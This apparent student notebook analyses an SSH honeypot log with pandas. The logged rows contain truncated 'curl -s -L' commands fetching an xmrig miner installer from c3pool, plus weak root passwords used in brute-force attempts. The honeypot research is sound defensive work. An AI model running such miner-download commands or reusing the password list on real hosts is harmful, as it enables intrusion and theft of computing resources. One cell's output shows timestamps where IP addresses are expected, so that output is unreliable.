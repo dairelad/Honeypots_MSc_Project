{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ebb9b74f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import datetime as datetime"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "73fbd509",
   "metadata": {},
   "outputs": [],
   "source": [
    "csv_url = 'https://raw.githubusercontent.com/dairelad/Honeypot_data/master/ssh_log.csv'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "5b487fdb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>ip</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>url</th>\n",
       "      <th>commands</th>\n",
       "      <th>usernames</th>\n",
       "      <th>passwords</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>221.181.185.159</td>\n",
       "      <td>2021-10-29 12:42:42.058</td>\n",
       "      <td>http://download.c3pool.com/xmrig_setup/raw/mas...</td>\n",
       "      <td>b'curl -s -L http://download.c3pool.com/xmrig_...</td>\n",
       "      <td>root</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>209.141.60.103</td>\n",
       "      <td>2021-10-29 13:37:03.763</td>\n",
       "      <td>http://download.c3pool.com/xmrig_setup/raw/mas...</td>\n",
       "      <td>b'curl -s -L http://download.c3pool.com/xmrig_...</td>\n",
       "      <td>root</td>\n",
       "      <td>123</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>209.141.60.103</td>\n",
       "      <td>2021-10-29 13:37:55.014</td>\n",
       "      <td>http://download.c3pool.com/xmrig_setup/raw/mas...</td>\n",
       "      <td>b'curl -s -L http://download.c3pool.com/xmrig_...</td>\n",
       "      <td>root</td>\n",
       "      <td>12345</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>209.141.60.103</td>\n",
       "      <td>2021-10-29 13:38:48.386</td>\n",
       "      <td>http://download.c3pool.com/xmrig_setup/raw/mas...</td>\n",
       "      <td>b'curl -s -L http://download.c3pool.com/xmrig_...</td>\n",
       "      <td>root</td>\n",
       "      <td>123456</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>130.209.157.48</td>\n",
       "      <td>2021-10-29 13:39:03.443</td>\n",
       "      <td>http://download.c3pool.com/xmrig_setup/raw/mas...</td>\n",
       "      <td>b'curl -s -L http://download.c3pool.com/xmrig_...</td>\n",
       "      <td>root</td>\n",
       "      <td>root</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                ip                timestamp  \\\n",
       "0  221.181.185.159  2021-10-29 12:42:42.058   \n",
       "1   209.141.60.103  2021-10-29 13:37:03.763   \n",
       "2   209.141.60.103  2021-10-29 13:37:55.014   \n",
       "3   209.141.60.103  2021-10-29 13:38:48.386   \n",
       "4   130.209.157.48  2021-10-29 13:39:03.443   \n",
       "\n",
       "                                                 url  \\\n",
       "0  http://download.c3pool.com/xmrig_setup/raw/mas...   \n",
       "1  http://download.c3pool.com/xmrig_setup/raw/mas...   \n",
       "2  http://download.c3pool.com/xmrig_setup/raw/mas...   \n",
       "3  http://download.c3pool.com/xmrig_setup/raw/mas...   \n",
       "4  http://download.c3pool.com/xmrig_setup/raw/mas...   \n",
       "\n",
       "                                            commands usernames passwords  \n",
       "0  b'curl -s -L http://download.c3pool.com/xmrig_...      root         0  \n",
       "1  b'curl -s -L http://download.c3pool.com/xmrig_...      root       123  \n",
       "2  b'curl -s -L http://download.c3pool.com/xmrig_...      root     12345  \n",
       "3  b'curl -s -L http://download.c3pool.com/xmrig_...      root    123456  \n",
       "4  b'curl -s -L http://download.c3pool.com/xmrig_...      root      root  "
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = pd.read_csv(csv_url)\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "8259b162",
   "metadata": {},
   "outputs": [],
   "source": [
    "cr_date = datetime.datetime.strptime(df['timestamp'].iloc[-1], '%Y-%m-%d %H:%M:%S.%f').strftime(\"%B %d, %Y\\n%H:%M\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "60993ab6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "October 29, 2021\n",
      "14:09\n"
     ]
    }
   ],
   "source": [
    "print(cr_date)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "57c7f603",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "74"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "totalConnections = df.shape[0]\n",
    "totalConnections"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "b163b0e8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['2021-10-29 12:42:42.058', '2021-10-29 13:37:03.763',\n",
       "       '2021-10-29 13:37:55.014', '2021-10-29 13:38:48.386',\n",
       "       '2021-10-29 13:39:03.443', '2021-10-29 13:39:04.430',\n",
       "       '2021-10-29 13:39:28.948', '2021-10-29 13:39:40.485',\n",
       "       '2021-10-29 13:39:40.659', '2021-10-29 13:39:41.415',\n",
       "       '2021-10-29 13:40:16.827', '2021-10-29 13:40:37.520',\n",
       "       '2021-10-29 13:40:50.960', '2021-10-29 13:41:26.350',\n",
       "       '2021-10-29 13:41:33.526', '2021-10-29 13:41:50.790',\n",
       "       '2021-10-29 13:41:50.793', '2021-10-29 13:41:50.794',\n",
       "       '2021-10-29 13:41:50.795', '2021-10-29 13:41:50.796',\n",
       "       '2021-10-29 13:41:50.797', '2021-10-29 13:41:58.511',\n",
       "       '2021-10-29 13:42:22.917', '2021-10-29 13:42:25.954',\n",
       "       '2021-10-29 13:42:32.332', '2021-10-29 13:42:47.026',\n",
       "       '2021-10-29 13:43:21.370', '2021-10-29 13:43:43.112',\n",
       "       '2021-10-29 13:44:16.549', '2021-10-29 13:44:38.782',\n",
       "       '2021-10-29 13:45:09.514', '2021-10-29 13:45:33.107',\n",
       "       '2021-10-29 13:46:04.248', '2021-10-29 13:46:14.902',\n",
       "       '2021-10-29 13:46:26.036', '2021-10-29 13:46:58.387',\n",
       "       '2021-10-29 13:47:17.772', '2021-10-29 13:47:53.049',\n",
       "       '2021-10-29 13:48:47.317', '2021-10-29 13:49:41.959',\n",
       "       '2021-10-29 13:49:53.606', '2021-10-29 13:50:39.696',\n",
       "       '2021-10-29 13:51:32.773', '2021-10-29 13:51:37.563',\n",
       "       '2021-10-29 13:52:33.840', '2021-10-29 13:53:28.792',\n",
       "       '2021-10-29 13:53:42.927', '2021-10-29 13:53:56.827',\n",
       "       '2021-10-29 13:54:23.710', '2021-10-29 13:54:57.021',\n",
       "       '2021-10-29 13:54:57.790', '2021-10-29 13:55:16.688',\n",
       "       '2021-10-29 13:55:54.107', '2021-10-29 13:56:09.858',\n",
       "       '2021-10-29 13:56:51.780', '2021-10-29 13:57:03.493',\n",
       "       '2021-10-29 13:57:48.506', '2021-10-29 13:57:58.916',\n",
       "       '2021-10-29 13:58:44.328', '2021-10-29 13:58:52.843',\n",
       "       '2021-10-29 13:59:10.764', '2021-10-29 13:59:37.683',\n",
       "       '2021-10-29 13:59:50.902', '2021-10-29 14:00:51.709',\n",
       "       '2021-10-29 14:01:02.712', '2021-10-29 14:01:48.185',\n",
       "       '2021-10-29 14:02:43.706', '2021-10-29 14:03:38.263',\n",
       "       '2021-10-29 14:04:33.280', '2021-10-29 14:05:31.748',\n",
       "       '2021-10-29 14:06:27.517', '2021-10-29 14:07:20.412',\n",
       "       '2021-10-29 14:08:15.341', '2021-10-29 14:09:08.499'], dtype=object)"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['ip'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6819960",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
